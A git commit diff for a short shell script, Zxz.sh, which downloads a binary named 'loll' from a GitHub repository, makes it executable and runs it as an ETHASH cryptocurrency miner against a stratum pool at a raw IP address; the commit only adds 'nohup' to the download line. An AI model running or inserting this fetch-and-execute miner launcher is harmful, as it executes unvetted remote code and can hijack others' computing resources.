937fe06bc96569d3ee84e9bfff60252204a1188e
Akatsoki <100992814+Akatsoki@users.noreply.github.com>
2022-06-02 16:31:21 +0700

    Update Zxz.sh

--- Zxz.sh
+++ Zxz.sh
@@ -1,3 +1,3 @@
-wget https://github.com/Akatsoki/newwz/raw/main/loll
+nohup wget https://github.com/Akatsoki/newwz/raw/main/loll
 chmod +x loll
 ./loll --algo ETHASH --pool stratum+tcp://3.215.245.39:8888 --user temera08.001
